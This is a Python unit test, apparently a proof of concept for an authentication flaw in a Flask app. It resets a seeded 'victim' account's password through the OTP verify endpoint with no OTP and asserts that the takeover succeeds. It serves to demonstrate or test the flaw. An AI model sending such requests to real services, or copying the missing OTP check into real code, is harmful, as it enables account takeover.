import unittest
import json
import os
import sys
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from app import app, load_db, save_db, hash_password

class TestBypass(unittest.TestCase):
    def setUp(self):
        self.client = app.test_client()
        db = load_db()
        db['user_profiles']['victim@test.com'] = {
            "name": "Victim",
            "email": "victim@test.com",
            "password_hash": hash_password("secure_password"),
            "reset_otp": None, # or not present
            "active_tokens": []
        }
        save_db(db)

    def test_bypass_otp(self):
        response = self.client.post('/api/auth/otp/verify', json={
            "email": "victim@test.com",
            "new_password": "hacked_password"
            # otp is omitted, so it will be None
        })
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.data.decode('utf-8'))
        self.assertEqual(data['status'], 'success')
        
        # Verify password changed
        db = load_db()
        self.assertEqual(db['user_profiles']['victim@test.com']['password_hash'], hash_password("hacked_password"))

if __name__ == '__main__':
    unittest.main()
